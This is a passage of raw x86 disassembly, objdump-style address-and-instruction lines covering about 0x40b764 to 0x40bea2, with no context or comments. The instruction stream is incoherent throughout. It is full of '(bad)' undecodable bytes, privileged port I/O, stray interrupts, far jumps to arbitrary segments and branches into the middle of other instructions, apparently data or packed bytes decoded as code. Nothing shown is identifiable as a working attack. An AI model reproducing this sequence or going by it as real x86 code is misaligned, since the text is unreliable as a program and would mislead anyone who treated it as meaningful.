  40b764:	mov    WORD PTR [edx],?
  40b766:	push   ds
  40b767:	jge    0x40b72b
  40b769:	add    al,0x41
  40b76b:	mov    dh,0x98
  40b76d:	outs   dx,DWORD PTR ds:[esi]
  40b76e:	ret    0xed1b
  40b771:	inc    edi
  40b772:	lods   al,BYTE PTR ds:[esi]
  40b773:	push   ebp
  40b774:	mov    ebp,0x781b082a
  40b779:	push   edi
  40b77a:	imul   ebp,DWORD PTR [ebp+0x2e],0xffffffcc
  40b77e:	or     bl,BYTE PTR [esi+0x229512dc]
  40b784:	int    0x3f
  40b786:	and    BYTE PTR [ecx],al
  40b788:	ss jp  0x40b769
  40b78b:	inc    ebp
  40b78c:	xchg   DWORD PTR [esi-0x58],eax
  40b78f:	cmp    ah,BYTE PTR [ecx-0x21]
  40b792:	jno    0x40b76c
  40b794:	in     eax,dx
  40b795:	test   DWORD PTR [ebp-0x7c],edi
  40b798:	and    DWORD PTR [ebx+0x584003c1],ebx
  40b79e:	ror    cl,1
  40b7a0:	loope  0x40b7ed
  40b7a2:	inc    edi
  40b7a3:	test   esp,edx
  40b7a5:	inc    edi
  40b7a6:	retf   
  40b7a7:	xchg   ecx,eax
  40b7a8:	scas   al,BYTE PTR es:[edi]
  40b7a9:	mov    bh,BYTE PTR [esi-0x5a99a2a]
  40b7af:	inc    ebx
  40b7b0:	push   ds
  40b7b1:	add    BYTE PTR [edx],cl
  40b7b3:	xlat   BYTE PTR ds:[ebx]
  40b7b4:	fstp   QWORD PTR [eax+0x55]
  40b7b7:	ds xchg esp,eax
  40b7b9:	push   ds
  40b7ba:	mov    al,ds:0xe709a1ea
  40b7bf:	(bad)  
  40b7c0:	and    ebx,DWORD PTR [esi]
  40b7c2:	cwde   
  40b7c3:	cmp    al,0x4b
  40b7c5:	sub    BYTE PTR [ecx],al
  40b7c7:	or     BYTE PTR [eax-0x7380b6f5],ch
  40b7cd:	jecxz  0x40b773
  40b7cf:	mov    ebx,0x397e706d
  40b7d4:	inc    ecx
  40b7d5:	pop    ss
  40b7d6:	xchg   esi,eax
  40b7d7:	lock or eax,eax
  40b7da:	sbb    BYTE PTR [eax+edx*4+0x26],cl
  40b7de:	mov    esi,0x4fc3d44
  40b7e3:	repz jg 0x40b77b
  40b7e6:	jb     0x40b81c
  40b7e8:	mov    dl,0xb3
  40b7ea:	push   cs
  40b7eb:	pop    eax
  40b7ec:	mov    ah,0x46
  40b7ee:	add    eax,DWORD PTR [ebp-0x27260cfb]
  40b7f4:	aad    0x23
  40b7f6:	jl     0x40b85a
  40b7f8:	add    eax,DWORD PTR [eax-0x35aa7ce4]
  40b7fe:	lea    eax,[edx+ecx*1+0x65169c8]
  40b805:	mov    ch,BYTE PTR [ebx]
  40b807:	std    
  40b808:	mov    cl,0xcf
  40b80a:	pop    edx
  40b80b:	jae    0x40b7c8
  40b80d:	iret   
  40b80e:	aad    0x6c
  40b810:	mov    esp,0x5562a58c
  40b815:	mov    ch,0x7f
  40b817:	push   eax
  40b818:	add    dh,BYTE PTR [ebx]
  40b81a:	xchg   edi,eax
  40b81b:	ins    DWORD PTR es:[edi],dx
  40b81c:	icebp  
  40b81d:	mov    ecx,0xf65ce889
  40b822:	cmp    DWORD PTR [ebx-0x14],ecx
  40b825:	dec    esp
  40b826:	xchg   edx,ebx
  40b828:	mov    ebx,0xf6783500
  40b82d:	cld    
  40b82e:	int    0xef
  40b830:	xor    eax,0x7885585f
  40b835:	inc    esi
  40b836:	sti    
  40b837:	inc    ecx
  40b838:	cmp    dl,bh
  40b83a:	push   0x74
  40b83c:	stos   BYTE PTR es:[edi],al
  40b83d:	lds    dx,DWORD PTR [eax+0x4]
  40b841:	xor    al,0x83
  40b843:	ror    BYTE PTR [eax],1
  40b845:	mov    ebx,0x12371fab
  40b84a:	(bad)  
  40b84b:	jge    0x40b7ef
  40b84d:	stc    
  40b84e:	icebp  
  40b84f:	scas   eax,DWORD PTR es:[edi]
  40b850:	dec    edi
  40b851:	jbe    0x40b834
  40b853:	addr16 mov bh,0xfb
  40b856:	out    0x15,al
  40b858:	sub    DWORD PTR [edx],ecx
  40b85a:	ja     0x40b838
  40b85c:	jne    0x40b846
  40b85e:	dec    eax
  40b85f:	inc    edi
  40b860:	or     bl,ah
  40b862:	shr    BYTE PTR [ecx-0xd],1
  40b865:	pop    edi
  40b866:	sub    bh,BYTE PTR [edi-0x5ca8bd84]
  40b86c:	mov    eax,ds:0xb0f93663
  40b871:	pop    ecx
  40b872:	mov    eax,0x657226c8
  40b877:	xor    BYTE PTR [eax],cl
  40b879:	and    al,0x13
  40b87b:	xor    BYTE PTR [ecx],dl
  40b87d:	fucomp st(1)
  40b87f:	jnp    0x40b8f7
  40b881:	ins    DWORD PTR es:[edi],dx
  40b882:	in     al,0x63
  40b884:	(bad)  
  40b885:	fdivr  QWORD PTR [ebx+0x1]
  40b888:	nop
  40b889:	push   ebx
  40b88a:	aas    
  40b88b:	jo     0x40b87d
  40b88d:	jle    0x40b8c7
  40b88f:	inc    ecx
  40b890:	in     al,dx
  40b891:	mov    al,ds:0x1aa736f6
  40b896:	leave  
  40b897:	mov    eax,ds:0x77572668
  40b89c:	je     0x40b8a4
  40b89e:	jp     0x40b829
  40b8a0:	push   ds
  40b8a1:	std    
  40b8a2:	mov    ecx,0x893302b1
  40b8a7:	cs inc ebp
  40b8a9:	lea    edx,cs:[ebp+0x651297b9]
  40b8b0:	jno    0x40b90d
  40b8b2:	ins    DWORD PTR es:[edi],dx
  40b8b3:	xor    al,0xbf
  40b8b5:	inc    edx
  40b8b6:	jae    0x40b8b6
  40b8b8:	inc    ebx
  40b8b9:	add    BYTE PTR [ebp+0x50ad7dea],cl
  40b8bf:	xchg   edx,eax
  40b8c0:	cmp    BYTE PTR [esp+ebx*2-0x26],cl
  40b8c4:	in     al,dx
  40b8c5:	outs   dx,BYTE PTR ds:[esi]
  40b8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c7:	ja     0x40b898
  40b8c9:	xlat   BYTE PTR ds:[ebx]
  40b8ca:	out    0xdb,al
  40b8cc:	sub    BYTE PTR [edi-0x3a7130cf],al
  40b8d2:	mov    al,ds:0xee7d8e7f
  40b8d7:	mov    dl,0x82
  40b8d9:	in     al,dx
  40b8da:	mov    bh,0x4d
  40b8dc:	xchg   edx,eax
  40b8dd:	sbb    ah,cl
  40b8df:	adc    esp,edi
  40b8e1:	inc    BYTE PTR [ecx+eax*8]
  40b8e4:	lds    esi,FWORD PTR [ebx-0x63]
  40b8e7:	mov    ecx,0x81b5e400
  40b8ec:	lds    ecx,FWORD PTR [edi-0x33]
  40b8ef:	xor    DWORD PTR [eax+0x297c405e],ebx
  40b8f5:	jmp    0x7342bb62
  40b8fa:	in     eax,0x77
  40b8fc:	xor    al,0x5a
  40b8fe:	out    0x7d,al
  40b900:	mov    ch,0x99
  40b902:	inc    esi
  40b903:	sbb    DWORD PTR [ebp+edi*8+0x37c4e69],esp
  40b90a:	dec    eax
  40b90b:	push   esp
  40b90c:	mov    ecx,0xad6e7ea0
  40b911:	retf   
  40b912:	nop
  40b913:	pop    esp
  40b914:	mov    al,0x95
  40b916:	pushf  
  40b917:	push   0x70b521f5
  40b91c:	scas   eax,DWORD PTR es:[edi]
  40b91d:	(bad)  
  40b91e:	fistp  DWORD PTR [edx-0x19]
  40b921:	mov    dl,al
  40b923:	(bad)  
  40b924:	pop    ebp
  40b925:	jg     0x40b8d5
  40b927:	and    eax,0x2df1d5c2
  40b92c:	inc    eax
  40b92d:	or     al,0x81
  40b92f:	cmp    BYTE PTR [edi+0x20],al
  40b932:	or     DWORD PTR [edx],ebx
  40b934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b935:	fcompp 
  40b937:	(bad)  
  40b938:	or     ah,bl
  40b93a:	call   0xbcca99ed
  40b93f:	or     eax,0x37867faa
  40b944:	or     BYTE PTR ss:[eax],dl
  40b947:	push   eax
  40b948:	in     eax,dx
  40b949:	sub    BYTE PTR [esi+0x7b2e886b],ch
  40b94f:	mov    ds,WORD PTR [edi+0x55]
  40b952:	and    esp,DWORD PTR [edi+edx*4+0x78]
  40b956:	xor    al,0x7d
  40b958:	fstp   TBYTE PTR [esi]
  40b95a:	retf   
  40b95b:	xor    al,0x8c
  40b95d:	loope  0x40b966
  40b95f:	and    eax,0x3835702f
  40b964:	inc    esp
  40b965:	lods   al,BYTE PTR ds:[esi]
  40b966:	xor    ecx,DWORD PTR [edx+0xba8edc5]
  40b96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b96d:	iret   
  40b96e:	outs   dx,DWORD PTR ds:[esi]
  40b96f:	arpl   WORD PTR [ebx+0x63],ax
  40b972:	inc    esi
  40b973:	mov    ah,0x3c
  40b975:	mov    WORD PTR [bp+si-0x30b2],fs
  40b97a:	xchg   ebx,eax
  40b97b:	daa    
  40b97c:	xor    edi,DWORD PTR [ebp-0x46]
  40b97f:	inc    esp
  40b980:	adc    ah,0x8b
  40b983:	or     al,0x41
  40b985:	pusha  
  40b986:	or     al,0x6f
  40b989:	adc    ch,BYTE PTR [edx-0x631d0946]
  40b98f:	adc    eax,DWORD PTR [ebx-0x59]
  40b992:	fsubr  QWORD PTR [eax+0x79253e0d]
  40b998:	inc    edi
  40b999:	cwde   
  40b99a:	in     al,dx
  40b99b:	cmp    DWORD PTR [edx+eiz*2-0x3a],ecx
  40b99f:	inc    esp
  40b9a0:	mov    eax,0xdccf3e4c
  40b9a5:	in     al,0xf2
  40b9a7:	into   
  40b9a8:	pop    es
  40b9a9:	(bad)  
  40b9aa:	jmp    edx
  40b9ac:	outs   dx,BYTE PTR ds:[esi]
  40b9ad:	(bad)  
  40b9ae:	push   ebp
  40b9af:	out    dx,al
  40b9b0:	push   0xe8d63c84
  40b9b5:	xchg   BYTE PTR [edx],bh
  40b9b7:	and    BYTE PTR ds:0x91f0ee44,dh
  40b9bd:	shl    BYTE PTR [ebx+0x16925795],1
  40b9c3:	(bad)  
  40b9c4:	out    0xd5,al
  40b9c6:	in     eax,dx
  40b9c7:	scas   eax,DWORD PTR es:[edi]
  40b9c8:	xor    ch,dl
  40b9ca:	or     eax,0xc5be2497
  40b9cf:	call   0x54a7:0x836f3ade
  40b9d6:	mov    bl,0x11
  40b9d8:	mov    BYTE PTR [edx-0x80],bh
  40b9db:	call   0x7b20e30f
  40b9e0:	and    ah,BYTE PTR [edx-0x32]
  40b9e3:	xchg   edi,eax
  40b9e4:	cmp    eax,0x1e7bc821
  40b9e9:	jae    0x40ba05
  40b9eb:	mov    dh,bl
  40b9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ee:	out    0xdb,al
  40b9f0:	sbb    eax,0x44ea65c1
  40b9f5:	or     eax,eax
  40b9f7:	fiadd  WORD PTR ds:0x62e4202
  40b9fd:	test   al,0x3d
  40b9ff:	enter  0xee15,0x1e
  40ba03:	loopne 0x40ba08
  40ba05:	fs test al,0x19
  40ba08:	popf   
  40ba09:	js     0x40ba70
  40ba0b:	pop    ecx
  40ba0c:	aas    
  40ba0d:	aaa    
  40ba0e:	imul   edx,DWORD PTR [ebp+ecx*4-0x4a],0x26f9871c
  40ba16:	imul   esp,DWORD PTR [eax-0x3a],0xae48d2f4
  40ba1d:	adc    eax,0x7958049a
  40ba22:	and    BYTE PTR [edi-0x1a58b819],bl
  40ba28:	outs   dx,DWORD PTR ds:[esi]
  40ba29:	push   es
  40ba2a:	pop    edx
  40ba2b:	push   ds
  40ba2c:	xchg   ebp,eax
  40ba2d:	add    al,0xb6
  40ba2f:	imul   esp,DWORD PTR [edi-0x61],0xffffffb8
  40ba33:	push   ss
  40ba34:	bound  ebx,QWORD PTR fs:[eax+0x7fe703d5]
  40ba3b:	jo     0x40ba27
  40ba3d:	fnstenv [eax+ebp*1+0x11]
  40ba41:	outs   dx,BYTE PTR ds:[esi]
  40ba42:	and    edx,DWORD PTR [edx+0x18]
  40ba45:	das    
  40ba46:	xchg   esp,eax
  40ba47:	dec    ebp
  40ba48:	jns    0x40ba70
  40ba4a:	xchg   ebx,eax
  40ba4b:	inc    ebp
  40ba4c:	clc    
  40ba4d:	sub    esp,eax
  40ba4f:	push   es
  40ba50:	or     DWORD PTR [eax*8-0x1215eed6],ebx
  40ba57:	mov    edi,0xa4c5a96b
  40ba5c:	test   BYTE PTR [edi],0x56
  40ba5f:	scas   al,BYTE PTR es:[edi]
  40ba60:	jge    0x40bae0
  40ba62:	sti    
  40ba63:	pop    eax
  40ba64:	fs int 0x17
  40ba67:	xchg   BYTE PTR ds:0x2b4bb3dd,bl
  40ba6d:	inc    esp
  40ba6e:	cmp    dh,cl
  40ba70:	test   al,0x38
  40ba72:	les    esi,FWORD PTR [edx+0x30]
  40ba75:	push   esi
  40ba76:	int    0xff
  40ba78:	mov    dh,0x78
  40ba7a:	xchg   ecx,eax
  40ba7b:	jmp    0x99a9:0xd26c7458
  40ba82:	test   eax,0xe407e8dd
  40ba87:	lods   eax,DWORD PTR ds:[esi]
  40ba88:	add    eax,0x85bcb029
  40ba8d:	sar    DWORD PTR [edx-0x32],0xfd
  40ba91:	jo     0x40ba44
  40ba93:	and    al,BYTE PTR [edi-0x31]
  40ba96:	repz or al,0x5a
  40ba99:	xchg   ecx,edx
  40ba9b:	ret    
  40ba9c:	lods   al,BYTE PTR ds:[esi]
  40ba9d:	mov    cl,0xd9
  40ba9f:	xor    BYTE PTR [edi+0x2bcf9f37],al
  40baa5:	push   ebp
  40baa6:	test   eax,0xfc3d32b9
  40baab:	aas    
  40baac:	aad    0x62
  40baae:	inc    esi
  40baaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab0:	(bad)  
  40bab2:	shl    BYTE PTR [ecx+0x4ec9c559],0xac
  40bab9:	repz test al,0x58
  40babc:	sub    bh,dh
  40babe:	pop    ebx
  40babf:	ss aad 0x32
  40bac2:	cmc    
  40bac3:	hlt    
  40bac4:	xor    al,0x4f
  40bac6:	mov    bl,0xde
  40bac8:	pop    ecx
  40bac9:	(bad)  
  40baca:	jae    0x40bae2
  40bacc:	and    BYTE PTR [eax+0x30],al
  40bacf:	scas   al,BYTE PTR es:[edi]
  40bad0:	(bad)  
  40bad1:	ja     0x40babb
  40bad3:	(bad)  
  40bad4:	xchg   ebx,eax
  40bad5:	into   
  40bad6:	data16 (bad) 
  40bad8:	les    ecx,FWORD PTR [edi+0x5e]
  40badb:	push   es
  40badc:	mov    cl,bl
  40bade:	jmp    0x60ed699c
  40bae3:	sub    al,0x1b
  40bae5:	mov    cl,0x22
  40bae7:	mov    ebp,0xce576817
  40baec:	xor    bl,BYTE PTR [ebx+ebp*8-0x74d7f8a7]
  40baf3:	jg     0x40baf8
  40baf5:	das    
  40baf6:	lods   eax,DWORD PTR ds:[esi]
  40baf7:	jbe    0x40baee
  40baf9:	iret   
  40bafa:	inc    ebp
  40bafb:	xor    eax,0x1cd78e87
  40bb00:	sub    al,BYTE PTR [edx-0x75753966]
  40bb06:	sub    cl,dh
  40bb08:	or     BYTE PTR [ebx-0x295626d3],bl
  40bb0e:	sub    edi,DWORD PTR [edx]
  40bb10:	sub    edx,ebp
  40bb12:	lahf   
  40bb13:	and    bh,BYTE PTR [eax-0x5b]
  40bb16:	sbb    eax,0xabb31da0
  40bb1b:	call   0xfb59:0x39cb7408
  40bb22:	add    al,0x9
  40bb24:	ror    BYTE PTR [esi+0x24],1
  40bb27:	vmread edi,eax
  40bb2a:	mov    dl,ah
  40bb2c:	(bad)  
  40bb2d:	pop    ss
  40bb2e:	or     BYTE PTR [ecx-0x6c],cl
  40bb31:	xor    eax,0xedd08ccd
  40bb36:	fimul  DWORD PTR [edx+0x63]
  40bb39:	mov    eax,ds:0x1434ca41
  40bb3e:	pushf  
  40bb3f:	dec    ecx
  40bb40:	mov    WORD PTR [ebp+edi*2-0xd],?
  40bb44:	cmp    BYTE PTR [edi],0x3f
  40bb47:	add    BYTE PTR [ecx+ebp*1-0x32],dh
  40bb4b:	cmp    BYTE PTR [bp+di],0x56
  40bb4f:	test   eax,0x6608e09e
  40bb54:	mov    ch,0x6f
  40bb56:	outs   dx,DWORD PTR ds:[esi]
  40bb57:	outs   dx,BYTE PTR ds:[esi]
  40bb58:	ja     0x40bbb4
  40bb5a:	jle    0x40bb2b
  40bb5c:	mov    edx,0x2e257d30
  40bb61:	and    DWORD PTR [ebx+0xfc927dd],ebx
  40bb67:	jbe    0x40baf2
  40bb69:	sbb    ebx,eax
  40bb6b:	mov    esi,0x10104c2e
  40bb70:	fs retf 
  40bb72:	push   0x2b2d88f7
  40bb77:	mov    ebx,0x4173a90e
  40bb7c:	jae    0x40bbd9
  40bb7e:	jecxz  0x40bbac
  40bb80:	sbb    DWORD PTR [eax+0x5c],0x20ccb6cf
  40bb87:	stc    
  40bb88:	clc    
  40bb89:	scas   al,BYTE PTR es:[edi]
  40bb8a:	js     0x40bb1c
  40bb8c:	inc    ebx
  40bb8d:	es push cs
  40bb8f:	int    0xc2
  40bb91:	stos   BYTE PTR es:[edi],al
  40bb92:	bound  ebx,QWORD PTR [ecx+0x3c]
  40bb95:	cmp    al,0xfc
  40bb97:	pop    ebp
  40bb98:	add    eax,0x884cebf1
  40bb9d:	mov    dl,0x8a
  40bb9f:	int    0xa2
  40bba1:	pusha  
  40bba2:	cli    
  40bba3:	inc    ebx
  40bba4:	sbb    bl,bl
  40bba6:	xor    esp,esi
  40bba8:	test   eax,0x6fdc37c
  40bbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbae:	sub    esi,edi
  40bbb0:	mov    fs,WORD PTR [eax+0x6f]
  40bbb3:	(bad)  
  40bbb4:	fdivr  QWORD PTR [esi-0x7e083c1d]
  40bbba:	dec    esp
  40bbbb:	fs jno 0x40bc1a
  40bbbe:	sub    al,BYTE PTR [edx+0x1dc72a95]
  40bbc4:	add    edx,DWORD PTR [ebx-0x6c]
  40bbc7:	xchg   edi,eax
  40bbc8:	stos   BYTE PTR es:[edi],al
  40bbc9:	fs iret 
  40bbcb:	dec    ebx
  40bbcc:	lahf   
  40bbcd:	(bad)  
  40bbce:	mov    al,BYTE PTR ds:[edi+0x2d]
  40bbd2:	repnz aad 0x26
  40bbd5:	and    BYTE PTR [eax],al
  40bbd7:	push   esi
  40bbd8:	and    esp,ebx
  40bbda:	fs mov edx,0x94a217a2
  40bbe0:	outs   dx,BYTE PTR ds:[esi]
  40bbe1:	pop    ebp
  40bbe2:	push   ebp
  40bbe3:	cwde   
  40bbe4:	cmp    edx,edx
  40bbe6:	or     ch,ah
  40bbe8:	aam    0x9f
  40bbea:	mov    BYTE PTR [edx+0x16],al
  40bbed:	pushf  
  40bbee:	loop   0x40bb72
  40bbf0:	ss pop ebx
  40bbf2:	das    
  40bbf3:	mov    esp,0xd3c365b0
  40bbf8:	pop    edi
  40bbf9:	mov    ecx,cs
  40bbfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfc:	xchg   ecx,eax
  40bbfd:	stos   DWORD PTR es:[edi],eax
  40bbfe:	repz dec DWORD PTR [ecx]
  40bc01:	sub    eax,0x53e0379e
  40bc06:	add    BYTE PTR [ebx-0x1a],0x95
  40bc0a:	xor    al,0xa5
  40bc0c:	cld    
  40bc0d:	loop   0x40bc6d
  40bc0f:	ficomp DWORD PTR [edi+eiz*4-0x72]
  40bc13:	(bad)  
  40bc15:	call   0x933bf097
  40bc1a:	adc    al,0x83
  40bc1c:	inc    esi
  40bc1e:	(bad)  
  40bc1f:	cld    
  40bc20:	outs   dx,BYTE PTR es:[esi]
  40bc22:	pop    ebx
  40bc23:	cmp    ebx,eax
  40bc25:	xor    eax,0xe5c4d4e3
  40bc2a:	jno    0x40bc87
  40bc2c:	rol    BYTE PTR [ebp+0x15eef32d],1
  40bc32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc33:	fnsave [ebx]
  40bc35:	xchg   ebx,eax
  40bc36:	cdq    
  40bc37:	lods   eax,DWORD PTR ds:[esi]
  40bc38:	aas    
  40bc39:	sahf   
  40bc3a:	dec    esi
  40bc3b:	or     DWORD PTR [esi+0x6c],ebp
  40bc3e:	in     eax,0x41
  40bc40:	add    DWORD PTR [eax+ecx*1-0x54],ebx
  40bc44:	inc    esp
  40bc45:	(bad)  [ecx+edi*8+0x6b6ff060]
  40bc4c:	pushf  
  40bc4d:	mov    ds:0x2b7e96e2,eax
  40bc52:	xlat   BYTE PTR ds:[ebx]
  40bc53:	xchg   esi,eax
  40bc54:	repz and al,0x42
  40bc57:	pop    esi
  40bc58:	pusha  
  40bc59:	scas   al,BYTE PTR es:[edi]
  40bc5a:	call   0x79c6198e
  40bc5f:	(bad)
  40bc62:	(bad)  
  40bc64:	xlat   BYTE PTR ds:[ebx]
  40bc65:	aaa    
  40bc66:	inc    edi
  40bc67:	mov    al,ah
  40bc69:	push   edi
  40bc6a:	mov    eax,ds:0x2e75924
  40bc6f:	and    bl,bl
  40bc71:	ds or  al,0x80
  40bc74:	xor    DWORD PTR fs:[eax+0x1b],0x33bed63c
  40bc7c:	sub    edx,DWORD PTR [ecx+0x4e7ec186]
  40bc82:	mov    cl,0xf1
  40bc84:	out    0xe4,al
  40bc86:	into   
  40bc87:	push   edi
  40bc88:	pop    ebp
  40bc89:	arpl   di,cx
  40bc8b:	aam    0x39
  40bc8d:	xor    edx,edi
  40bc8f:	adc    eax,0x679120c0
  40bc94:	and    ebx,DWORD PTR [edx-0xe]
  40bc97:	and    dh,ah
  40bc99:	std    
  40bc9a:	cmp    al,BYTE PTR [esi*2+0xf632572]
  40bca1:	mov    eax,ds:0x271e5fc6
  40bca6:	jbe    0x40bc4c
  40bca8:	push   ebp
  40bca9:	stos   DWORD PTR es:[edi],eax
  40bcaa:	sub    DWORD PTR [edi-0xab2404b],ecx
  40bcb0:	out    dx,eax
  40bcb1:	(bad)  
  40bcb2:	(bad)  
  40bcb3:	loopne 0x40bcef
  40bcb5:	outs   dx,DWORD PTR ds:[esi]
  40bcb6:	and    dh,bl
  40bcb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcb9:	fnstsw WORD PTR [ebp-0x5a390bf4]
  40bcbf:	fcmovnbe st,st(3)
  40bcc1:	cmp    eax,0x26e10843
  40bcc6:	pop    ebx
  40bcc7:	imul   edi,ebp,0x4a
  40bcca:	aas    
  40bccb:	sub    DWORD PTR [ebx+0x3a2ec319],0xffffffde
  40bcd2:	test   al,0x7a
  40bcd4:	leave  
  40bcd5:	test   esp,eax
  40bcd7:	repnz sbb al,cl
  40bcda:	pop    ds
  40bcdb:	xlat   BYTE PTR ds:[ebx]
  40bcdc:	js     0x40bc8d
  40bcde:	push   es
  40bcdf:	ret    0x8b97
  40bce2:	jbe    0x40bd4b
  40bce4:	rcl    DWORD PTR [edx],cl
  40bce6:	mov    cl,0x13
  40bce8:	or     dl,BYTE PTR [edx]
  40bcea:	ins    BYTE PTR es:[edi],dx
  40bceb:	add    ah,bl
  40bced:	mov    dh,0x7
  40bcef:	push   es
  40bcf0:	bound  ebp,QWORD PTR [ecx+esi*4+0x4b]
  40bcf4:	pop    eax
  40bcf5:	out    0x38,al
  40bcf7:	push   0xffffffeb
  40bcf9:	std    
  40bcfa:	pop    ss
  40bcfb:	dec    edi
  40bcfc:	addr16 or eax,ebp
  40bcff:	pop    eax
  40bd00:	dec    ecx
  40bd01:	mov    eax,ds:0x5cdc1b3f
  40bd06:	cmc    
  40bd07:	mov    ebx,0x8c2668c4
  40bd0c:	imul   eax,DWORD PTR [ecx-0x41],0x2afcb4f5
  40bd13:	int    0xf9
  40bd15:	leave  
  40bd16:	ds pop ds
  40bd18:	push   es
  40bd19:	int3   
  40bd1a:	pushf  
  40bd1b:	adc    ebp,eax
  40bd1d:	xchg   ebx,eax
  40bd1e:	div    ebp
  40bd20:	push   ss
  40bd21:	hlt    
  40bd22:	sar    BYTE PTR [ebp+0x32792378],cl
  40bd28:	jp     0x40bd59
  40bd2a:	fiadd  DWORD PTR [edx]
  40bd2c:	popf   
  40bd2d:	sahf   
  40bd2e:	bound  esp,QWORD PTR [edi-0x3b52c366]
  40bd34:	shl    BYTE PTR [esi-0x6e8d305c],1
  40bd3a:	sbb    eax,DWORD PTR [eax]
  40bd3c:	and    bh,BYTE PTR [esi-0x4e]
  40bd3f:	cdq    
  40bd40:	jno    0x40bd11
  40bd42:	test   eax,0x3772600e
  40bd47:	add    dl,BYTE PTR [edx-0x15]
  40bd4a:	mov    edi,0x3aed26c2
  40bd4f:	jae    0x40bcfa
  40bd51:	sbb    dh,BYTE PTR [edx]
  40bd53:	push   ecx
  40bd54:	push   eax
  40bd55:	push   ss
  40bd56:	repz dec ebx
  40bd58:	push   0xb08a8565
  40bd5d:	ss pop edx
  40bd5f:	sub    ah,BYTE PTR ds:0xf48d6625
  40bd65:	or     bh,al
  40bd67:	stos   BYTE PTR es:[edi],al
  40bd68:	jbe    0x40bcfd
  40bd6a:	mov    ds:0x7cccce4c,eax
  40bd6f:	test   al,0xf6
  40bd71:	push   eax
  40bd72:	xor    al,0x58
  40bd74:	mov    DWORD PTR [ecx-0x4],ecx
  40bd77:	cmp    eax,0x2e50c4a6
  40bd7c:	les    edi,FWORD PTR [esi+ebp*1+0x2ae1c5d9]
  40bd83:	pop    DWORD PTR [edx-0x2435fd31]
  40bd89:	mov    gs,WORD PTR [ebp+edx*2-0x4006c42e]
  40bd90:	jge    0x40bd2f
  40bd92:	pushf  
  40bd93:	leave  
  40bd94:	or     cl,BYTE PTR [esi-0x12543327]
  40bd9a:	stos   DWORD PTR es:[edi],eax
  40bd9b:	inc    ecx
  40bd9c:	mov    WORD PTR [ebx-0x5f],cs
  40bd9f:	jno    0x40bda0
  40bda1:	aaa    
  40bda2:	jge    0x40bdf6
  40bda4:	out    dx,al
  40bda5:	call   0x251abdf9
  40bdaa:	aas    
  40bdab:	mov    edx,0x2b3f7e89
  40bdb0:	xor    BYTE PTR [edx+0x3b4c749],0x59
  40bdb7:	cld    
  40bdb8:	pop    ecx
  40bdb9:	mov    esp,0x486dcfb2
  40bdbe:	mov    eax,ds:0x9d03bf60
  40bdc3:	sti    
  40bdc4:	popf   
  40bdc5:	xor    cl,BYTE PTR [ecx+eax*1]
  40bdc8:	add    cl,BYTE PTR [ecx+0x62]
  40bdcb:	sbb    DWORD PTR [ecx-0x2d49103f],ebp
  40bdd1:	sbb    DWORD PTR [esi],eax
  40bdd3:	rol    DWORD PTR [ebp+edx*4+0x63a611eb],0x8d
  40bddb:	xchg   edi,eax
  40bddc:	adc    edi,eax
  40bdde:	inc    edx
  40bddf:	les    ebp,FWORD PTR [edi-0x512667a9]
  40bde5:	jmp    ebp
  40bde7:	ret    
  40bde8:	or     DWORD PTR [ebx-0x6cc528a7],edi
  40bdee:	adc    BYTE PTR [esi-0x1eeebd33],bh
  40bdf4:	stos   DWORD PTR es:[edi],eax
  40bdf5:	dec    ebx
  40bdf6:	inc    edi
  40bdf7:	jne    0x40bdfb
  40bdf9:	mov    dh,0xe8
  40bdfb:	sar    BYTE PTR [ecx-0x3dbc6d9],1
  40be01:	scas   al,BYTE PTR es:[edi]
  40be02:	mov    esp,0x9c48775
  40be07:	cmp    al,0x36
  40be09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0a:	fs pop ds
  40be0c:	lock lea ebp,[eax]
  40be0f:	pop    es
  40be10:	inc    eax
  40be11:	loope  0x40be14
  40be13:	sub    BYTE PTR [esi-0x2c],dl
  40be16:	dec    ebx
  40be17:	adc    esp,DWORD PTR [edx+ebp*4+0x4]
  40be1b:	cdq    
  40be1c:	xchg   edx,eax
  40be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be1e:	mov    eax,ds:0xd320cb5c
  40be23:	cld    
  40be24:	test   al,0x5d
  40be26:	adc    BYTE PTR [edi],dl
  40be28:	push   ebp
  40be29:	pop    edi
  40be2a:	dec    ebx
  40be2b:	inc    ebx
  40be2c:	push   0xffffff89
  40be2e:	(bad)  
  40be2f:	shr    BYTE PTR [ecx-0x53dadfe2],0x17
  40be36:	sbb    al,0x14
  40be38:	(bad)  
  40be39:	lods   eax,DWORD PTR ds:[esi]
  40be3a:	hlt    
  40be3b:	xor    DWORD PTR [eax],edx
  40be3d:	(bad)  
  40be3e:	or     BYTE PTR [edi-0x6b],ch
  40be41:	jae    0x40be73
  40be43:	loop   0x40be51
  40be45:	les    ecx,FWORD PTR [ecx-0x48f7b130]
  40be4b:	sbb    BYTE PTR [ebx-0x36d251ae],dl
  40be51:	sbb    DWORD PTR [esi-0x5b],0xdb5e6b87
  40be58:	(bad)  
  40be59:	xchg   edx,eax
  40be5a:	icebp  
  40be5b:	cmp    al,0x47
  40be5d:	je     0x40be47
  40be5f:	call   0xaebb:0x1c06804e
  40be66:	cli    
  40be67:	dec    eax
  40be68:	mov    ebp,0x9f835dd7
  40be6d:	mov    edx,0x495d56b1
  40be72:	sub    al,0xf3
  40be74:	stc    
  40be75:	cli    
  40be76:	imul   eax,DWORD PTR [ebx+eax*2+0x4da6660],0x9104f8bd
  40be81:	push   ds
  40be82:	test   al,0xa6
  40be84:	inc    esp
  40be85:	inc    eax
  40be86:	and    eax,0x7de2b45
  40be8b:	cmp    edi,DWORD PTR [edx+0x7d5f83e3]
  40be91:	or     dh,dl
  40be93:	or     BYTE PTR ds:0xbd075ba4,dh
  40be99:	out    dx,eax
  40be9a:	js     0x40be58
  40be9c:	dec    esi
  40be9d:	les    edx,FWORD PTR [ecx]
  40be9f:	loope  0x40bea6
  40bea1:	pop    esi
  40bea2:	and    BYTE PTR [edx],bh
